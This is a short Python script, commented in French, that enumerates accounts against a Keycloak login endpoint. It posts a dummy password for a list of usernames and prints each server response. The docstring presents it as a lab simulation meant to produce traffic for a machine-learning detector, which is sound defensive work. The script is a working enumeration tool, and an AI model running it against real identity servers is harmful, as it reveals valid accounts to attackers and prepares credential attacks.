"""
ATTAQUE : Account Enumeration (T1087.002)
==========================================
But : découvrir quels usernames existent dans le système.
Technique : envoyer des tentatives avec un mot de passe bidon et analyser
les réponses. Sur certaines configs Keycloak, la réponse diffère entre
"user n'existe pas" et "user existe mais mauvais password".

Pattern détectable par le ML :
  - Beaucoup d'usernames différents testés depuis 1 IP
  - Même mot de passe (bidon) à chaque fois
  - Cadence régulière
"""
import sys, time, requests

KEYCLOAK_URL = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.1.16:8080"
REALM         = "sso-demo"
CLIENT_ID     = "ticket-app"
CLIENT_SECRET = "ticket-app-secret"

# Liste de noms à tester (mélange de vrais + faux pour réalisme)
USERNAMES_TO_PROBE = [
    # Vrais (existent)
    "alice", "bob", "charlie", "superadmin",
    # Faux (n'existent pas)
    "john", "marie", "paul", "sophie", "michel", "nathalie",
    "thomas", "isabelle", "pierre", "catherine", "philippe",
    "francoise", "jacques", "monique", "claude", "denise",
    "patrick", "annie", "robert", "simone", "andre", "yvette",
    "marcel", "germaine", "henri", "louise", "gerard", "jeanne",
]

# Mot de passe bidon (on teste juste l'existence du user)
PROBE_PWD = "TestProbe123!"


def probe_user(username):
    url = f"{KEYCLOAK_URL}/realms/{REALM}/protocol/openid-connect/token"
    data = {
        "grant_type":   "password",
        "client_id":    CLIENT_ID,
        "client_secret":CLIENT_SECRET,
        "username":     username,
        "password":     PROBE_PWD,
    }
    try:
        r = requests.post(url, data=data, timeout=10)
        return r.status_code, r.json().get("error_description", "")
    except Exception as e:
        return 0, str(e)


print(f"[*] Account enumeration sur {KEYCLOAK_URL}")
print(f"[*] {len(USERNAMES_TO_PROBE)} usernames à tester\n")

for i, u in enumerate(USERNAMES_TO_PROBE, 1):
    status, msg = probe_user(u)
    print(f"  [{i:3d}/{len(USERNAMES_TO_PROBE)}] {u:15s} -> HTTP {status} | {msg[:50]}")
    time.sleep(0.5)  # cadence régulière, signature de bot

print("\n[*] Terminé.")
